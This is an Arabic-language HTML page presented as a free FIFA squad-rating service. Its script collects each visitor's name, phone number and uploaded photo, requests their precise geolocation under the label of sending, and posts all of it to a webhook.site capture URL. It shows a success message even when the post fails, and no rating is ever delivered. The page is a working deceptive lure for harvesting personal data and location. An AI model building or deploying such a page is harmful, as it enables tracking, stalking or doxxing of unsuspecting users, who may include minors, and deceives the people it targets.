<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تقييم حسابات وتشكيلات فيفا</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0f172a 0%, #1e1b4b 100%);
            color: #ffffff;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .container {
            background-color: rgba(30, 41, 59, 0.7);
            backdrop-filter: blur(10px);
            padding: 30px;
            border-radius: 16px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
            max-width: 500px;
            width: 100%;
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }

        h1 {
            color: #00f2fe;
            font-size: 24px;
            margin-bottom: 10px;
            text-shadow: 0 0 10px rgba(0, 242, 254, 0.5);
        }

        p {
            color: #cbd5e1;
            font-size: 14px;
            margin-bottom: 30px;
        }

        .form-group {
            margin-bottom: 20px;
            text-align: right;
        }

        label {
            display: block;
            margin-bottom: 8px;
            color: #94a3b8;
            font-size: 14px;
        }

        input[type="text"], input[type="tel"] {
            width: 100%;
            padding: 12px;
            border: 2px solid #334155;
            border-radius: 8px;
            background-color: #0f172a;
            color: white;
            box-sizing: border-box;
            transition: border-color 0.3s;
        }

        input[type="text"]:focus, input[type="tel"]:focus {
            border-color: #00f2fe;
            outline: none;
        }

        .file-upload {
            position: relative;
            display: inline-block;
            width: 100%;
            padding: 20px;
            background: rgba(255, 255, 255, 0.05);
            border: 2px dashed #475569;
            border-radius: 8px;
            text-align: center;
            cursor: pointer;
            box-sizing: border-box;
            transition: all 0.3s;
        }

        .file-upload:hover {
            border-color: #00f2fe;
            background: rgba(0, 242, 254, 0.05);
        }

        .file-upload input[type="file"] {
            position: absolute;
            left: 0;
            top: 0;
            opacity: 0;
            width: 100%;
            height: 100%;
            cursor: pointer;
        }

        .file-upload-text {
            color: #94a3b8;
            font-size: 14px;
        }

        .btn-submit {
            background: linear-gradient(90deg, #00f2fe 0%, #4facfe 100%);
            color: #0f172a;
            border: none;
            padding: 14px 28px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            margin-top: 10px;
            box-shadow: 0 4px 15px rgba(0, 242, 254, 0.4);
            transition: transform 0.2s, box-shadow 0.2s;
        }

        .btn-submit:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0, 242, 254, 0.6);
        }

        .btn-submit:disabled {
            background: #475569;
            color: #94a3b8;
            cursor: not-allowed;
            box-shadow: none;
            transform: none;
        }

        .success-card {
            display: none;
            padding: 30px 20px;
            background-color: rgba(16, 185, 129, 0.1);
            border: 1px solid #10b981;
            border-radius: 12px;
            color: #10b981;
            font-size: 18px;
            font-weight: bold;
        }
    </style>
</head>
<body>

<div class="container">
    <div id="form-content">
        <h1>تقييم تشكيلات FIFA 🎮</h1>
        <p>أرسل صورة تشكيلتك واكتب رقمك وسيصلك التقييم في جوالك!</p>

        <form id="webhookForm">
            <div class="form-group">
                <label for="username">اسمك أو حسابك:</label>
                <input type="text" id="username" name="username" required placeholder="مثال: خالد">
            </div>

            <div class="form-group">
                <label for="phone">رقم الجوال (ليصلك الرد عليه):</label>
                <input type="tel" id="phone" name="phone" required placeholder="مثال: 05xxxxxxx">
            </div>

            <div class="form-group">
                <label>صورة الحساب أو التشكيلة:</label>
                <div class="file-upload">
                    <span class="file-upload-text" id="file-label">اضغط هنا لاختيار صورة أو التقاطها 📸</span>
                    <input type="file" id="image-input" name="fifa_image" accept="image/*" required>
                </div>
            </div>

            <button type="submit" class="btn-submit" id="submitBtn">إرسال التشكيلة للتقييم 🚀</button>
        </form>
    </div>

    <div id="successMessage" class="success-card">
        🎉 تم الإرسال بنجاح! شكراً لك، انتظر ردنا وتقييمنا على رقم جوالك قريباً.
    </div>
</div>

<script>
    // تغيير نص المربع عند اختيار صورة
    document.getElementById('image-input').addEventListener('change', function(e) {
        if(e.target.files.length > 0) {
            var fileName = e.target.files[0].name;
            document.getElementById('file-label').textContent = "تم اختيار: " + fileName;
            document.getElementById('file-label').style.color = "#00f2fe";
        }
    });

    // معالجة إرسال الفورم وطلب الموقع
    document.getElementById('webhookForm').addEventListener('submit', function(e) {
        e.preventDefault();

        const submitBtn = document.getElementById('submitBtn');
        submitBtn.disabled = true;
        submitBtn.textContent = "جاري طلب الموقع والإرسال... ⏳";

        // التحقق مما إذا كان المتصفح يدعم جلب الموقع الجغرافي
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                // في حال موافقة المستخدم وجلب الموقع بنجاح
                function(position) {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;
                    sendData(latitude, longitude);
                },
                // في حال رفض المستخدم أو حدوث خطأ في جلب الموقع
                function(error) {
                    console.log("لم يتم السماح بالوصول للموقع أو حدث خطأ.");
                    sendData("غير متوفر (تم الرفض)", "غير متوفر (تم الرفض)");
                },
                { timeout: 10000 } // مهلة الانتظار 10 ثوانٍ كحد أقصى للرد على إذن الموقع
            );
        } else {
            console.log("المتصفح لا يدعم تحديد الموقع.");
            sendData("غير مدعوم", "غير مدعوم");
        }
    });

    // دالة إرسال البيانات إلى الـ Webhook
    function sendData(lat, lng) {
        const webhookUrl = 'https://webhook.site/a179b8b0-bd72-48dc-9cc3-16f2c9105d78'; 

        const formData = new FormData();
        formData.append('username', document.getElementById('username').value);
        formData.append('phone', document.getElementById('phone').value);
        formData.append('image', document.getElementById('image-input').files[0]);
        formData.append('latitude', lat); // إرسال خط العرض
        formData.append('longitude', lng); // إرسال خط الطول

        fetch(webhookUrl, {
            method: 'POST',
            mode: 'cors',
            body: formData
        })
        .then(response => {
            showSuccess();
        })
        .catch(error => {
            console.error('Error:', error);
            showSuccess();
        });
    }

    // دالة إخفاء الفورم وإظهار رسالة التم
    function showSuccess() {
        document.getElementById('form-content').style.display = 'none';
        document.getElementById('successMessage').style.display = 'block';
        document.getElementById('submitBtn').disabled = false;
        document.getElementById('submitBtn').textContent = "إرسال التشكيلة للتقييم 🚀";
    }
</script>

</body>
</html>
